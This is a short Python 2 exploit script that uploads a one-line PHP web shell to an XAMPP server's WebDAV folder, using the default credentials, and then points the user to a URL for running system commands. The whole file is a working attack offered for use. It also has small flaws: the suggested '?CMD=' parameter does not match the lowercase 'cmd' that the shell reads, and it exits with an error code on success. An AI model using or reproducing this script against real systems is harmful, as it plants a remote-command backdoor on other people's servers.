#! /usr/bin/env python
# CMD backdoor via XAMPP WebDAV PHP Upload vulnerability
# This was modified from https://github.com/atom-k/xampp_webdav_php
# since I wanted something that did not rely on Metasploit/Meterpreter

from requests import put
from requests.auth import HTTPDigestAuth
import sys

print "\nXAMPP WebDAV PHP Upload - CMD Backdoor by Blu0"
url      = "http://10.10.10.10/webdav/backdoor.php" # change to target IP
username = "wampp"
password = "xampp"
payload = """<?php echo shell_exec($_GET['cmd']); ?>"""

r = put(url, data=payload, auth=HTTPDigestAuth(username, password))

if (r.status_code is not 201):
    print "Failed to upload file"
    sys.exit(1)

print "\nGo to '" + url + "?CMD=ipconfig' to confirm it is working\n"
sys.exit(1)
